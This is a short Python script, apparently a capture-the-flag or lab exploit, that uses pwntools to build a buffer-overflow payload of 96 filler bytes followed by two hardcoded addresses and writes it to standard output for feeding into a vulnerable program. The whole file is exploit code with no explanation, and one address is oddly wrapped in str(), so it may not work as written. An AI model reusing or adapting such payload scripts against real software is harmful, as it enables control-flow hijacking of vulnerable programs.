from pwn import *
import sys

buf = flat(
    "A"*96,
    0x0804c014,
    str(0x080492a1)
)
sys.stdout.buffer.write(buf)